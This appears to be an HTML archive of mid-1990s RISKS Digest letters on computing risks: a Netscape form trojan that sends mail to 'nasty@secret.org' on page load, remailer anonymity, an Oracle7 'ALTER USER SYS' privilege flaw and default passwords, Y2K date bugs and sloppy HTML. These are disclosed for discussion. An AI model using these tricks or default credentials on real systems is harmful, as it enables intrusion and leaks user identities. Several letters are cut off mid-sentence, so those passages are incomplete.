<A HREF="mailto:nasty@secret.org">nasty@secret.org</A> with the subject gotcha and the body "hi=there".
<P>
This is insidious; it means that E-mail messages, purportedly from me (and
all traces will show they really are from me) can be sent anywhere, without
my knowledge, with contents that I do not approve.  Further, it means that I
can no longer count on browsing a site without my userid being disclosed.
Unlike Java, there is no way to disable this.  [Also been submitted to

&gt;<BR>
&gt; Thanks for the input. The mistake was never noticed before because the<BR>
&gt; Netscape browsers are smart enough to detect the error and deal with it.<BR>
&gt; Lynx, however, is not. The problem is fixed, although I don't recommend<BR>
&gt; looking at the site with anything but Netscape 1.1N and higher. We<BR>
&gt; incorporate too many of Netscape's features to make viewing these pages<BR>
&gt; without it useful.
<P>
I have nothing against Netscape trying to be smart, but the very
sloppiness that makes it behave reasonably for unreasonable input
leads web page designers to believe that their web pages have been
debugged if they work correctly on Netscape.  Perhaps Netscape should
have a `careful' mode for helping web page maintainers to provide
`squeaky clean' pages.
<P>
I have found numerous web page problems with Lynx in this way, and
when informed of these problems, some web page maintainers have been
downright snotty in their responses.  Their attitude seems to be `it
serves you right for not using a graphical browser like Netscape'.
<P>
Perhaps the web site designers should wake up to the fact that most of
the sophisticated web surfers that I know either use an ascii browser
like Lynx, or turn off image loading when surfing, because they actually
want to visit more than one web site per day.  All those pretty 4-color
_buttons_ (??) that they use look good for _one_ visit, and thereafter<BR>
become the source of a lot of irritation due to slow page loading.

As the maintainer of a remailer-list, I felt I should respond to this.
Strassmann and Marlow have lately been getting quite a bit of press
spreading anti-remailer fear, uncertainty and doubt. Almost all of it is
inaccurate.
<P>
It is certainly possible that governments are running remailers.
Personally, I tend to doubt it, but that's just because I know most of the
remailer operators. Even if governments were running remailers, the use of a
chain of remailers, rather than just one, protects against compromise of
identity even if one or more remailers are compromised. It suffices that one
of the remailers in the chain is honest.
It certainly isn't the case that the most popular remailers in France and
Germany are run by government agencies. Maybe if there were remailers in
these countries, they would be, but there aren't. There used to be one in
Germany, but it's no longer operating. There's never been one in France. If
there were, it would be quite illegal, due to the French crypto
restrictions.
<P>
The ability to crack 1000-bit keys would represent a major advance in
factoring technology. 1024-bit keys less than an order of magnitude more
effort to crack than 1000, so recommending them in face of 1000-bit keys
having been cracked is ridiculous.
The current record for factoring an RSA key is still RSA-129, which
is only about 428 bits. Advances in factoring are expected, but most
people figure 1000 bits is a long way away.

Remailers come in three different grades of security, depending on how
sophisticated a client is used. Low grade remailers, including the popular
anon.penet.fi, are subject to simple comparison of incoming and outgoing
messages. So-called type-1 remailers use PGP encryption, so they are not
vulnerable to this attack, but can be analyzed by correlating the size of
incoming and outgoing messages. The Mixmaster remailers, by Lance Cottrell,
are based on David Chaum's original digital-mix theory, and can't be
size-correlated either.
I can't guarantee that the remailer network is secure, but I feel that
ease-of-use, reliability, and vulnerability to spamming are greater concerns
at this point. Not to mention misinformation.

Where I work, a security grille is opened and closed by means of a remote
control unit. As the grille can be closed by a short press of a button on
the remote control unit, it is quite possible to accidentally end up with
the operator on the outside of a closed security grille with the remote
control unit left locked inside. I did that yesterday morning.
<P>
For all the complexity of the situation, I had simply locked a "key" - the
remote control unit - inside the secured area.
<P>
After puzzling over the situation, I came up with the specific solution that
a remote control to close or lock a device shouldn't proceed to completion
unless the control is held on by the operator. (That kind of safeguard is
like not being able to lock something from outside without the key).
<P>
For the software analogy, imagine the situation when new bootstrap or
operating system code is loaded. If the new code fails to load or work for
any reason, there needs to be a means of booting from the old code.
<P>
In the software analogy the "key" is the bootstrap or operating system kernel
and code that make a computer, modem or other device work: one doesn't want
to let go of or throw away the old "key" until the new "key" is safely
written to non-volatile storage media and known to work. To allow the user to
delete the old code (especially inadvertently) without the new code working
is undesirable, yet some modems with user-upgradable firmware don't protect
the user against such behaviour. No doubt many RISKs readers have had similar
experiences with software upgrades of many kinds...

On 22 Jun 1995, I reported a "flaw" with Oracle7 and its ALTER USER
instruction that enabled any userid beginning with "sys" to "ALTER USER SYS
IDENTIFIED BY &lt;pw&gt;", giving complete system permission to ordinary users.
Amazingly, the command would fail for any user except "sys".  I sent a
notice to our Oracle contact and they fixed the problem in minutes (over the
phone).  I discovered the problem in release 7.1.4 and it is no longer
present in 7.2.3.
<P>
When I upgraded to 7.2.3, I noticed another "feature" (new to me anyway)
"ALTER SESSION SET CURRENT_SCHEMA= &lt;user&gt;".  It's a nifty little command
that allows you to change ids without a password (the import utility uses
it).  Anyway, during a restore (disk failures), I noticed that any user
could use the "ALTER SESSION" instruction regardless of whether they had
been granted that privilege or not.  I breathed a sigh of relief when it
seemed that "actual" authorities were enforced based upon the real userid.
Whew!  But, it sure does make me wonder if I haven't looked hard enough.
<P>
This reminded me of the Oracle6 export utility and how it placed passwords
for database links in plaintext.  Oracle 6 and 7 database files contain
plaintext strings.  All of this is ok if you simply change the permissions
on files, directories, or file systems (as Oracle recommends).  One other
thing that was a neat idea on Oracle's part, using a userid "scott" with the
password "tiger" to install the demos to.  Unfortunately, I've seen too many
systems that either did not disable the account when finished, or that
actually gave total permissions to "scott".  Ouch.  There have even been a
few cases of the "system" password still being "manager" from the install.
<P>
I think Oracle has an excellent RDBMS.  It performs quite well, and I've
survived many failures (knock on wood).  I I haven't used anything else in a
while, so I relate only to Oracle.  Anyway, the risks...  With any large,
complex sets of software "bugs" might silently hide, backdoors can remain
undetected, and a whole lot is handled without any human intervention.
Oracle has had its share of bugs and they have been good about correcting it
in some way.  The "backdoors" have implications that go beyond Oracle...

The problem wasn't simply due to the compact representation, but also to the
fact that the data required to interpret it was separated from the offence
record.  An awesomely large-scale foulup of the same nature was reported
here a few years ago; the police in Paris did their routine mailing of
citations for traffic offences, where the decoding information was kept on a
separate magnetic tape.  But this time someone had loaded the wrong tape;
one containing codes for serious criminal offences.  The result was that
thousands of people charged with double parking or running red lights were
sent documents accusing them of kidnapping or attempted murder; along with
demands for payment of trivial fines.  (One of the more popular charges was
"illegal handling of veterinary products", if I remember right).
<P>
Both examples are elementary failures of database design and management, and
there's been no excuse for them for 30-odd years.  "Lack of redundancy" is
exactly what relational normalization is *for*, and if done right it can

Normalization is not bad design.  It is good design, according to a
substantial body of relational database design literature.  Basically, you
want to use the smallest non-ambiguous code set for internal storage, then
use those codes to reference a human readable display code.  The risk is not
bad design, but rather inconsistent code definition across systems.
<P>
I have suffered from this as well.  I received a ticket for riding a bicycle
in a no bike riding zone, that was explicitly _not_ supposed to affect my
driving record.  It did, however, because the motor vehicle department
computers saw a non-recognized code propagated from the city computers, and
assumed it was something bad, rather than something innocuous or null.  I
had to take several days off work and run around between various courthouses
to fix the problem.  This shows the added risk of lost productivity due to
knowledgeable people being affected by stupid computer systems and
quixotically wanting to make the data good.
<P>
Chris also seems to have missed the obvious risk of fundamental systems
change over time.  Even only 13 years of school records is enough time for
substantial change in record-keeping and perhaps even "good" systems design.

Step back for a moment from the host of confusion seen around the leap year
issue.  It seems that one root cause is the deceptive simplicity and
regularity of the ordinary calendar.  Human nature seems to take regular
things for granted rather quickly.  If it would be more complicated, more
often, people would probably be more cautious and get it right.
<P>
Generalizing, I see that many computer systems introduce the same kind of
risk in other domains.  That is, they simplify and make many activities and
concepts more regular, but they can hide or postpone complexities and
exceptions.  When those exceptions occur, then people are typically not
prepared to handle them.

But what's the alternative?  Maybe it's enough to acknowledge the

<P>
May I suggest that the underlying problem with millennial and leap-year
software is a lack of incentive. Perhaps the major software firms could
mutually agree that stock options awarded during the next two years be
exercisable on, and only on, 29 Feb 2000. Care to guess what problem moves
to the top of every project's punch-list?
<P>
In the same vein, year-end bonuses should be payable only to employees
of record on 01 Jan 2000.

&gt;Let's just leap from December 31, 1999 straight to January 1, 2001.
<P>
There is one bright spot concerning the misperceptions over the beginning of
the twenty-first century: two chances for a big party.  Why risk missing the
true millenium?  You had better hit both just to be sure.

JavaScript uses a millisecond based system (since January 1, 1970).  There
are built-in methods for converting between dates and milliseconds, but
there is an error in the Mac version - it is always a day ahead of the
result yielded by the Unix and Windows JavaScript date functions.  (I am
fairly certain that this is a beta error and not a political statement. :)
<P>
And regardless of your accuracy, you must still deal with different date
formats.  I am thinking of how today can be both 3/8/96 and 8/3/96,
depending on your position on the globe. (That's one hell of a time zone...)

<P>
Computers do many useful tasks where precise timing is crucial.  We may not
be obsessed with time, but deciding when to turn out a steel mold is still
something we can't afford to get wrong.  (A previous comp.risks told of
daylight-savings time causing molten steel to be dumped on the floor.)
As long as time stamps on files are used for building programs, it will be
important for networked systems to be within a few seconds of each other.
<P>
The solution is to store time, and do comparison and computation, using
*only* the number of seconds from a fixed date.  The length of a second is
one of the few time of day-related things that doesn't change.

In Risks 17.87, Matthias Urlichs writes about the Unix `struct tm'
date-time interface:
<P>
IMHO, if the library is changed to return a four-digit date<BR>
instead of modulo 100, not much will break
<P>
Actually, it would break a lot of programs, including CVS, Emacs,
gawk, expect, GCC, Ghostscript, INN, mh, perl, pine, RCS, and zoo
(I just checked).
<P>
There are in fact three things you can do:
<OL>
<LI>drop the modulus nonsense and return the year in full,
<LI>just subtract 1900, so that the above algorithm continues to work,
<LI>return % 100, as before.
</OL>
There's only one thing to do for `struct tm', namely [2].  Unix has
done [2] since the 1970s, and the C Standard and Posix both require [2].
No doubt the original Unix developers should have chosen [1] twenty years ago,
but it would be unwise to change things at this late date.

<P>
An acquaintance of mine who is visiting from Russia was in Boston a few
weeks ago to take the Graduate Record Examination.  The examination is taken
solely on a computer.  No doubt you can see what is coming.
<P>
When the computer display asked my friend whether she would like to see test
results, she answered "yes" but nothing happened.  She asked a staff member
for assistance, but was told not to worry, because the test results "will be
mailed to you."
<P>
Yesterday's mail brought a form letter from GRE stating that her test
results had been "cancelled at your request."
<P>
My friend called to ask what this meant, and was told that there had been
"some problems" during the snowstorm, that all information about her test
was "gone", and she would have to retake the examination.
<P>
The RISK?  Perhaps it is unwise to schedule a GRE in Boston in the winter.

I have a little web robot running to keep track of changes to web pages.
This came in very handy this semester, as I have an instructor who puts all
assignments on the web: instead of having to check manually when the
instructor put up the assignment, I just set up to monitor his "What's new"
page and get mailed within 25 hours of a change.  This worked for a while
..., then a homework assignment was added to a different page without being
mentioned in the what's new.  Oops.  He was very understanding, but this
class of problems is something robot users -- as well as people using
netscape 2's update feature -- will want to keep in mind.

While many of us may be concerned about the consequences of increasing
computerisation of aircraft systems, one must not forget the other side.
Digital flight control can sometimes unequivocally improve safety.
<P>
Flight International, 13-19 March, p9, reports that the USN is upgrading the
F-14 flight control system with a digital system developed by GEC-Marconi
Avionics of the UK. "Three accidents within a month have prompted [.. the]
upgrade [..] to prevent flat spins and improve carrier-approach handling
qualities". The DFCS [..] has been flight-tested by the USN [..] and a
production contract awarded to upgrade 211 aircraft [..]."

&gt;Even if governments were running remailers, the use of a<BR>
&gt;chain of remailers, rather than just one, protects against compromise of<BR>
&gt;identity even if one or more remailers are compromised. It suffices that one<BR>
&gt;of the remailers in the chain is honest.
<P>
Unless I completely misunderstand remailers (I don't use them), one honest
remailer in a chain is sufficient only if you want to hide your identity
from the ultimate recipient.  However, if you also wish to hide from
government-run remailers, then it's necessary that the *first* remailer in
the chain be honest.  The first remailer has access to all your message's
original header fields.

Anyone trying to implement GPS as a means of collision avoidance for
trains will have their share of 'features' to work out.  The possibility of
trains operating on parallel track (such that they will pass each other), or
operating on rails that cross each other (grade separation) suddenly going
into "collision avoidance" may be accented by the known "dither" factor
found in commercial GPS equipment (a concept that wobbles the mind).

<P>
As someone who has worked for the railroad, I find it is scary to see this
type of technology touted as a "cure-all".  Most railroad collisions do not
involve "train vs. train", they involve train vs. "some other vehicle that
has crossed the track".  And most train vs. train incidents occur because
of driver error or signal failure. (Will satellite failure soon cause a rash
of high-speed train wrecks?)
<P>
The railroads call their train drivers "Engineers" -- yet many (most?) are
not degreed or even trained in much more than an apprentice type program.
It is a boring repetitive job, and the railroads drive to reduce costs, by
reducing crew numbers, may have as much or more to do with rail safety than
any other factor.
<P>
If my computer crashes, (even on a leap/non year) I may have a little "clean
up" to do.  But a 5-mile-long multihundred-thousand-pound piece of
technology crashing can really mess up your day. :-)

&gt; on, 29 Feb 2000.
<P>
While this was written in jest (hopefully), this is an extremely common
perception which is going to bite software professionals in the very near
future.  Anyone who subscribes to any Y2K discussion for more than a few
days will be struck by the large number of people desperately seeking any
viable solution to a problem which (most) upper management steadfastly
denies exists.
<P>
Or upper management will accept that it might be a problem, but _their_
bonus comes through with good returns this fiscal year and it's easier to
cut costs by eliminating "incompetent" employees whining about how a problem
in their own department will jeopardize the company years from now.
Besides, if everyone is in the same boat what's the harm if the worst
happens -- the company's competitors will be just as screwed up!
<P>
It's time people recognize that Y2K isn't a technical problem, it's a
management problem.  Technical people know that losing source code is a
Bad Idea.  Technical people know that compilers change, and that new
compilers (e.g., a COBOL compiler which can return CCYYMMDD instead of
only YYMMDD) may break other parts of the system.  Technical people know
that it's penny-wise, pound-foolish to toss away information (and that
the reason experienced analysts can command high salaries is they know
what you can safely toss, and what you need to keep even if that means
buying another disk and/or tape drive... and they know to keep an eye
open for changing technologies.)  Finally, technical people know that
it's ____________F_____A_____R_____________ cheaper to fix that bug today
than to wait even a month.
<P>
If we're serious about fixing the Y2K problem, we need to address this as a
business/management problem, not a technical problem.  If a large company
loses $2/share overnight because an auditing firm announces (and the
networks carry the story) that the company isn't ready for Y2K, we'll see
action.  Unfortunately, the first action will probably be to fire the
current technical people for letting the company get into this situation
despite repeated pleas for adequate resources being ignored for years. :-(
<P>
The RISKy moral of Y2K: software developers are like backcountry guides --
you tell them where you want to go and what you want to see and they'll take
you there _and back_ safely....  It might be expensive, but it's a heck of a
lot less expensive than talking a wrong turn and being stranded in the
wilderness with a broken leg.
<P>
But upper management is often like the legendary idiot from the big city who
hires a professional guide and then insists on the guide doing it like he
saw "in a movie once" instead of trusting the guide's experience and
training... and then complaining to everyone back home how the guide wasn't
any good since everything took twice as long and he only got to see a third
of what he was promised.

&gt; UNIX holds the time internally as the number of seconds since 1970-01-01.<BR>
&gt; "struct tm" is just a library abstraction. IMHO, if the library is changed<BR>
&gt; to return a four-digit date instead of modulo 100, not much will break --<BR>
&gt; typical Unix software frequently says "if year &lt; 1900 year += 1900" or some<BR>
&gt; such.
<BLOCKQUOTE><I>
[I think Matthias meant "since 1900", as already<BR>
noted by Steve Loughran in <A HREF="/Risks/17.85.html">RISKS-17.85</A>.  PGN]
</I></BLOCKQUOTE>
Actually, tm.tm_year is defined as the number of years since 1900.<BR>
The real year-keeping problem for UNIX machines isn't the library
routines that populate a struct tm; the first is programs that use
statements like
<P>
printf("%02d", tm.tm_year); [which will print ``100'' in the year 2000]
<P>
instead of
<P>
printf("%02d", tm.tm_year % 100);
<P>
and
<P>
printf("19%02d", tm.tm_year) [which will print ``19100'' in the year 2000]
<P>
instead of
<P>
printf("%4d", 1900 + tm.tm_year);
<P>
And the zeroeth, as mentioned before, is machines that set real<BR>
time on boot from hardware clocks that will fail near 2000.

The COBOL standard has been amended twice since the adoption of the 85
StandardIn particular, the first amendment (ANSI X3.23a-1989, ISO
1989/Amendment 1) added numerous functions including date functions which<BR>
deal with centuries.  Many vendors offer COBOL compilers which support these
functions.

&gt; With modern cheap storage media, room for say, a 16-letter string instead<BR>
&gt; of a single-letter code would make it hard to misconstrue
<P>
All this "throw hardware at the problem" attitude is a risk in itself. After
all never every computer system can have a $200 Gb HDD added to it. I'm sure
the disks systems for fault tolerant systems are somewhat more expensive.
But more significantly for data collection small hand-held computer systems
have very expensive storage: perhaps UKP 100 for 2Mb of FLASH (which has its
own problems with rapidly changing data).
<P>
Coding is here to stay until no computer system has storage limitations.
<P>
The real problem in the original article (coded data transferred from one
system to another had different meanings) is assuming that one code set
matches someone else's for the same purpose. The solution: manual checking or
a dictionary (which introduces yet more potential problems).

<P>
While data normalisation has its place, it also has its limits; in fact, it
is often better to denormalise database designs to some extent. Why?
Because the values to which codes refer change - departments change their
names, products cease to exist, employees come and go. For example, if you
just keep a product number, and the product name changes, last year's orders
will suddenly start referring to the new product name, which is usually the
Wrong Thing.
<P>
In addition, in this age of end-user access to data warehouses, excessive
normalisation imposes a burden on the end user, who will have to grovel all
over the place to decode all the values that they want to see. This is
precisely the problem that occurred in the current case: namely, people were
given the code numbers rather than the values to which they referred.  This
is a wholly different problem to normalisation, and is related more to
presenting data in a human-readable form.
<P>
Normalisation is fine in theory, but in practise, it should be treated as a
useful, but limited, design tool.

<A HREF="/Risks/17.88.html">RISKS-17.88</A> has an article about the Netscape forms 'feature' that
automatically sends e-mail upon loading a document. Risks kindly provides an
HTML code fragment which exhibits this behaviour.  When I loaded up this
newsletter in my browser, that code fragment was executed! Given that this
code represented a form of trojan horse, it is hardly appropriate for Risks
Newsletter to be perpetuating it!
<P>
The first risk is that of including 'live' code fragments in a publication,
especially one which is subject to several media.
<P>
The second risk is that of using an automated process to construct and
publish information on the Web -- especially if the input to that process is
e-mail.

<P>
&gt;  I have nothing against Netscape trying to be smart,
<P>
What Netscape does isn't merely "smart"; it's also a violation of the HTML
specification.
<P>
That specification defines what is or is not legal in an HTML document.
Programs which purport to be HTML viewers are supposed to confirm that the
document being viewed conforms to the HTML specification (e.g., not missing
"&lt;/A&gt;" markers after "&lt;A&gt;" markers) and complain if it doesn't.
<P>
Unfortunately, Netscape decided, "Why should we write something which checks
the HTML for validity, which we can just write a smart interpreter which
figures out what the author of a document *wanted* to do, even if they
didn't actually say that?"
<P>
Henry Baker has already pointed out one problem with this -- it allows
webmasters who use Netscape to test their HTML to be lazy about ensuring its
correctness.  Since Netscape is the most popular browser, and therefore more
webmasters use it than any other browser to check HTML, users who don't use
Netscape are often "shut out" of sites.
<P>
Worse, Netscape has intentionally implemented numerous features that are not
conformant with the HTML specification, that their browser supports but
others do not.  Instead of working through the process recognized by the
HTML-design community for adding functionality to HTML, they just added the
functionality they thought was needed.  Since many sites take advantage of
this additional functionality (it *is* pretty neat, after all), once again,
users who do not use Netscape are "shut out".
<P>
Rectifying the latter problem isn't simply a matter of adding Netscape's
functionality to the HTML specification, because they've added functionality
which is difficult, if not impossible, to implement in SGML (the Standard
Generalized Markup Language, which is the meta-language in which HTML is
defined).  That doesn't matter to Netscape, since (as I mentioned above)
their browser interprets the HTML in a do-what-I-mean fashion, rather than
in a "Is this valid HTML?" fashion, but it matters to the rest of the Web
community, since browsers which are trying to remain true to what HTML is
supposed to be simply may not be able to implement the features which more
and more sites are using.
<P>
{Begin politics.}
<P>
I find what Netscape has done totally reprehensible.  There was a recognized
body of people defining the HTML standard, a recognized procedure for
implementing changes to that standard, and a recognized "proper" way to
parse and display HTML code.  Netscape threw that all away, and I believe
that they were fully conscious when they did so that they were breaking the
standard and causing lots of grief for the other HTML developers in the
world.  What they're doing is nothing more than an attempt to make Netscape,
a commercial product, the only browser that can be used to access the full
potential of the Web, which is supposed to be free.  The sad thing is that
they may very well end up succeeding.

<P>
That won't always work either. After putting 2.0 on a machine I noticed
large chunks of text on one site disappearing. Seens That with Netscape 1.x
if it encountered a syntactical mistake such as &lt;A HREF="foo.gif&gt; instead of
&lt;A HREF="foo.gif"&gt; it would realize that a double quote was missing on the<BR>
end and, having reached the end of the anchor, "assume" one.

Not 2.0. If the double quote is missing, things go wonky. So the *real* risk
is to assume that "smarts" will propagate along with versions instead of

<P>
It is for this very reason that I put together "Composing Good HTML," a few
years ago (<A HREF="http://www.cs.cmu.edu/~tilt/cgh/">http://www.cs.cmu.edu/~tilt/cgh/</A>). Netscape pays at least token
attention to the problem, since they do have a reference to CGH in their own
documentation. Also, several HTML syntax checkers exist. The real RISK seems
to be that there is a popularly perceived "standard" -- HTML -- which is in
reality incredibly balkanized, with each browser choosing to interpret
different subsets and supersets of it in slightly (or not so slightly)
different ways. And that people's perceptions of that standard are largely
influenced by a WYSIWYG mentality that HTML only somewhat incidentally
supports.

<P>
I recently was involved in a lengthy discussion in
comp.infosystems.authoring.html about this very subject. Someone posted to
an other mailing list I subscribe to that Netscape allows such sloppy
behavior, in this case it was allowing a &lt;b&gt; to be closed by a &lt;/i&gt;. The
argument given to me in the USENET group was "Netscape is a HTML browser,
not a validator. You can't fault it for correcting an author's bad HTML!" Of
course most people don't use a validator they just fire up Netscape, load
the page, and if it "works" they put it on their server. The compromise we
seemed to settle on was the browsers should correct HTML to some extent but
should also state that fact in a dialog box similar to the Arena browser.
<P>
I was also taken back by their "Netscape bigotry". My favorite message was
one person stating that since I don't use Netscape I shouldn't be
complaining because I'm not using the Internet standard browser!!! (I'm
using Omniweb 2.0 on a NeXT machine in case you're wondering.
<P>
The risks? Taking one person's, or company's, HTML parser as the correct
one.  Netscape bigotry in use of tags, poor HTML, and attitude is an obvious
other.

Funny thing is, even though this is clearly not meant to be a real mailbox,
there really *is* is a secret.org, run by a friend of mine in DC.  I don't
think there's a user ID of "nasty" there, but anyway, I thought it rather
curious. Small world. Small net anyway.  I suppose an additional risk
inherent is silly cookies like this is that even when done as a joke, it's
actually possible to create unintended bad effects, such as revealing user

poor nasty with a form of "autospam", due to innocent Netscape users playing

I've gotten a couple of messages suggesting that altering the e-mail address

some platforms, but certainly not on a UNIX platform.

However, I did get a helpful suggestion: setting your outbound mail SMTP
server to a nonexistent machine (e.g., mailtrojan) will prevent this attack
by disabling all mailto URLs.  Of course, this makes Netscape useless as a

The problem Jon Reeves points out in <A HREF="/Risks/17.88.html">RISKS-17.88</A> certainly is insidious.  In
my case, I think there's a slightly different risk.  I don't use e-mail
associated with the internet account I use for Netscape.  I am one of three
people in the world that use a mail handler written as a learning exercise a
few years ago.  I get my e-mail from a different dial up connection from the
one I use for Netscape.  I have a userid on the sytem I connect to through
Netscape, and I'm willing to believe that Netscape is clever enough to get
e-mail out 'from' that userid, even though I've done nothing to help it.  If
Netscape is able to send mail purportedly from me, not only would I never
see it -- I'd never be aware if anyone replied (perhaps threatening me with
some dire consequences of having 'sent' the e-mail?)  On the other hand, I
may have hidden access to e-mail well enough that even Netscape can't find it
on my machine.  If so, it would be a way to work around the problem Jon
found, but probably not one that most people would find convenient.
<P>
By the way, this posting is from a completely different machine than
the one I described, but I don't run Netscape at all on this one.

[From Paul A. Strassmann, National Defense University<BR>

<P>
We find that a report by a Mr. Viktor Mayer-Schoenberger [e.g., <A HREF="/Risks/17.87.html">RISKS-17.87</A>]
citing our alleged statements at a Harvard University Conference has been
widely quoted on Internet, out of context.
<P>
Specifically, he attributed to us statements that a number of anonymous
remailers in the US are run by government agencies and that the most popular
remailers in France and Germany are also run by government agencies.  What Mr.
Viktor Mayer-Schoenberger reported as facts are his interpretations.  Our
comments were of a general academic nature.  We were not attributing remailer
activities to any specific governments, but rather commenting on the general
situation where much of the research on the use of networks has been paid for
by governments and therefore one can assume that they would know how to make
use of such facilities.  We have no specific knowledge of any particular
agency of any government offering remailers services.  Whether or how they use
remailers is not known to us.  Online users just need to be "aware of the
risks."

A University of California computer system administers U.C.'s $20 billion
retirement program.  A recent report by Infortal Associates concludes that
the security of the system was very weak, and that the audit trails were
flimsy and easily disabled.  Furthermore, no one had responsibility for
reviewing the audit trails.  The system can be accessed from the Internet,
and Infortal was able to do so using a widely known password.  However, a
University spokesman observed that no adverse penetrations had actually
taken place, no money has been lost, and the security flaws have been fixed.

[Well, in the absence of good audit trails, you may not know you have been
penetrated.   Also, even if a few security flaws may have been fixed,
such a system is never totally invulnerable to attack (whether on the
Internet or not).  But you all know that by now?  PGN]

Reader Andrew Rock has been investigating our foolproof data security
protocol, PGP-Y (Pretty Good Parapsychology). He intuited this missive to us:
<P>
"You were ill-advised to release the details of your PGP-Y -- "Pretty Good<BR>

US law prohibits the export of such highly secure transmission technology,<BR>
defining it as munitions. Your proposal must await government-approved key<BR>

beyond the imagination of government officers. Please do not carelessly put<BR>
the publication of AIR at risk while I have nearly two years left on my<BR>

Investigator Trevor Green and a large team at the University of Saskatchewan
have also been laboring in the field. Green reports:
<P>
"After an initial trial period of PGP-Y within our department, we have had<BR>
some disappointing initial results. While the transmission rate is nothing<BR>

<P>
Recent discussion of appropriate renaming of v.r. systems prompts one to
note that being an attractive sink for funding often involves production of
a two-word nonsequitur comprising an adjective and a noun.  The
juxtaposition of the incompatible modifier with the noun yields a conflicted
notion that makes possible a degree of cognitive friction generating new
ideas, permits wild and unsubstantiated claims to flourish, and empowers
marketing hyperbole that has no equal.
<P>
Examples include not only "virtual reality" but also "artificial intelligence"
and "expert systems".  In each, the combination is unlikely to the same
degree as a zen koan.  Although the metaphor may be a little overextended,
proponents seem to regard contemplation of the terms as one means of
achieving the experience of satori.
<P>
While the clever use of language is required to initiate funding flows, it
is generally unable to sustain it for more than about a decade.  Skilled
operators are able to generate a new term-pair every decade or so to ensure
continued flow of funds for research and development.

I agree that denormalise database design may be better, but not for the same
reasons Phil suggests.  What Phil has described is an example of poor coding
and understanding of relational design rather than a case for
denormalisation.  The use of a unique key that refers to the product number

Our school has some servers that run Solaris and some that run SunOS.  I
discovered that when I posted to USENET on the Solaris machines, my name
showed up as "-Hwa Huang" instead of "Wei-Hwa Huang".  After we traced down
the problem recently, it turned out that inews on the Solaris machines
assumed that the names in the passwd file looked like
<P>
foo-John Smith(bar)
<P>
where foo and bar are used to mean stuff that doesn't concern the user's name.
On the other hand, inews on SunOS used
<P>
John Smith,foo,bar
<P>
instead.  Obviously, the Solaris machines saw
<P>
foo-Wei-Hwa Huang(bar)
<P>
and got confused.
<P>
The RISKS are obvious.  Whomever compiled inews on the Solaris machines made
the assumption that the hyphen was a safe delimiter that would never appear
in a user's name.  Of course, with the SunOS method, names with commas in
them would confuse the system instead.  If there are people out there with
strange names, or perhaps use 2-byte characters, these "standard" systems
wouldn't fare too well.  On the other hand, while using something strange
such as $ for a delimiter would work in more cases, it certainly makes for
difficult reading of the source.  What's a designer to do?
<P>
Kudos to my excellent sysadmins for pinpointing and fixing the problem so
rapidly, by the way.

I recently changed ISPs and suddenly mail from one individual I correspond
with had a change in her address, so that my replies to her messages were
coming back with the User Unknown response.  Since I also obtain her
postings at a second ISP, I checked and found that her address was still the
original address at the second ISP.
<P>
[Incidentally, my mailer automatically uses the reply-to address if supplied,
or falls back to using the from address.  In this case, the "From:" address
was being used, and was being changed at *my* ISP when it was received,
whether in a Usenet message or a personal e-mail message.]
<P>
Having discovered this, I called the new ISP's technical support group and
explained my discovery.  While laughing, the support person tested my
contention internally on their system and discovered that, lo and behold, I
was correct in my theory.  For some reason, the @ns.net was being translated
to @norm.net by their system.  They name each of their machines, and one had
been named "norm".  For some reason, they had, somewhere in their system, a
conversion where ns=norm.  While this may have been required for some
purpose, it was being applied for a different purpose, totally unintended.
[Whether they could have discovered this via testing is unknown to me.]
<P>
It took two days, but they HAVE fixed the problem - without letting me know
when they had it fixed, and without letting me know exactly where the
problem occurred.
<P>
The risk is obvious, if you only have one ISP...  When mail is returned as
undeliverable, it may be that the address is incorrect because of something
your ISP has done and is totally unaware of. Believe me, this CAN result in
annoyance and frustration, both on your part and on the part of the person
you correspond with, half way around the world.  Fortunately we were not
involved in any correspondence where time was of the essence, or the problem
would have been far worse.

<P>
The message from Bob Heuman reminds your moderator that I have been itching
to grumble again about the ongoing RISKS bouncemail problems -- along the
lines of Phil Agre's posting on the risks of e-mail (Bouncemail Top 10) in
<A HREF="/Risks/16.76.html">RISKS-16.76</A>.  In the past week alone, I have had at least 20 new subscribers
using the majordomo listserv whose "From:" address or other explicitly
provided address was not a valid address, so that they could not receive
mail at their own given addresses!  This is truly ridiculous, although it
may be attributed to the rapid growth of the Internet community among folks
not used to the subtleties of life on the net.  I sometimes get as many as
100 bounces a day; even if I have just pruned away all the previous hard
bounces, I still get a bunch of *new* ones on the next issue.  The good news
is that the Internet is dynamic.  The bad news is that the Internet is
dynamic.
<P>
If you do not get RISKS for a long while, you should check the archives to
see whether you have been dropped from the list because of prolonged bounces
(or whether I have just been otherwise occupied).

<P>
The first risk is that of including `live' code fragments in a
publication, especially one which is subject to several media.
<P>
The second risk is that of using an automated process to construct
and publish information on the Web -- especially if the input to
that process is e-mail.
<P>
Just to expand on the above: ``Live code'' can stealthly come into
documents.  Any web site that offers to take online "feedback" or "comments"
has an open invitation to such trojan codes -- for example, an attacker can
simply type in applet code into an online form.
<P>
Moreover, it is perhaps more convenient to collect and sort these feedback
automatically and then view them through a web browser (instead of an editor
such as Emacs or MS Wordpad).  Thus, the risk is often there if one uses a
java-capable browser to do something useful.
<P>
On the other hand, there is the tendency that a newly discovered attack will
quickly lead to a patch that disables a useful feature in the browser or
interpreter.  Soon the features list is shortened to almost zero and ones
starts to ask why the language is needed at all.

A mate of mine, whom I will call Skip and his computer ralph.nomame.edu,
decided to look himself up on the "Who Where?" database.
He found his name, selected it, and was rewarded with the response:
<PRE>
* Name: ??? Console
E-mail: <A HREF="mailto:skip@ralph.nomame.edu">skip@ralph.nomame.edu</A>
Organization: cornell university, ithaca
Last Updated: --
</PRE>
This is all fine and good, except that a) he never registered himself with
the server and b) ralph.noname.edu is not a mail server and all mail there
will bounce.  So the question is, how did this E-mail address show up?  So,
I looked at my entry.
<PRE>
* Name: Brian Kelley
E-mail: <A HREF="mailto:brian@piglet.cam.cornell.edu">brian@piglet.cam.cornell.edu</A>
Organization: cornell university, ithaca
Last Updated: --
</PRE>
Now, piglet.cam.cornell.edu is also not my e-mail address.
<P>
We did a little digging and discovered that the standard unix command
"finger @ralph.noname.edu" responded with
<PRE>
[ralph.noname.edu]<BR>
Login	Name	TTY	Idle	When	Where
skip       ???  console 10:30  Tue 22:22
</PRE>
and "finger @piglet.cam.cornell.edu" responds with
<PRE>
[piglet.cam.cornell.edu]<BR>
User     Real Name         What    Idle  TTY  Host      Console Location
brian    Brian Kelley                        4 piglet   357 Theory Center
</PRE>
So, our assumption is, which is also a risk in itself, that some program
is fingering computers and "grep"ing the return info which, in the case
of skip is incorrect.
<P>
